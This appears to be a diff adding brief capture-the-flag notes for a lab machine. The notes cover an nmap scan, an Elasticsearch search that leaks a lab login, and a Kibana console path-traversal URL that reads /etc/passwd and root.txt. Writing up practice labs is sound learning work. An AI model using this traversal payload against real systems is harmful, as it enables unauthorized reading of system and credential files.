@@ -1,0 +1,7 @@
+nmap IP -sV
+http://10.10.143.167:9200/_search?q=password
+l33tperson 9Qs58Ol3AXkMWLxiEyUyyf
+going to port 8000 we see another open port open that,
+add the following to the url /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../../etc/passwd
+go to port 8000 and see that the password is in the root.txt file
+/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../../root.txt
